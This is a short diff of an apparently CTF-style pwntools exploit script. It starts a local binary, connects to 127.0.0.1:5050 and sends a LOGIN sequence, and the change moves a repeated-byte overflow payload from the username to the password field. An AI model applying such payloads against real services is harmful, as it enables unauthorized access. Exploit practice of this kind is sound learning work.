@@ -31,8 +31,10 @@ def start_remote(argv=[], *a, **kw):
     if args.GDB:
         gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
         #gdb.attach(io, gdbscript=gdbscript)
-    
-    #time.sleep(5)
+    else:
+        process([exe.path] + argv, *a, **kw)
+
+    #time.sleep(1)
     context.timeout = 5
 
     p = remote('127.0.0.1', 5050)
@@ -77,10 +79,10 @@ io.recv(timeout=1)
 io.sendline(b'LOGIN')
 io.recv(timeout=1)
 
-io.sendline(b'administrator'+b'\xc4' * 36)
+io.sendline(b'whatever')
 io.recv(timeout=1)
 
-io.sendline(b'test')
+io.sendline(b'\xc4' * 33)
 io.recv(timeout=1)
 
 #io.sendline(b'COMMAND')
